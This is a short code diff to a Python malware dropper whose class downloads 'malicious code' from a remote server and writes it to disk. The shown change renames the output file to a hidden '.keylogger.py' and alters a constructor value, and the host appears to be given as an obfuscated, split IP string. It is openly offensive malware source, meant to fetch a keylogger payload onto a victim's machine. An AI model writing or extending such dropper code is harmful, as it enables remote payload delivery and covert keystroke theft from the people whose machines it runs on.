@@ -57,7 +57,7 @@ class Dropper:
     def dump_data(self, data):
         """ Write the retrieved data from the server into the file.
         """
-        with open('malware.py', 'wb') as file:
+        with open('.keylogger.py', 'wb') as file:
             file.write(data)
 
     def download_malicious_code(self):
@@ -85,6 +85,6 @@ if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
 
     # Initialize dropper application.
-    dropper = Dropper('101.01', '.861.291', 729000000)
+    dropper = Dropper('101.01', '.861.291', 784000000)
     # Collect the malicious code and dump it into the file.
     dropper.download_malicious_code()
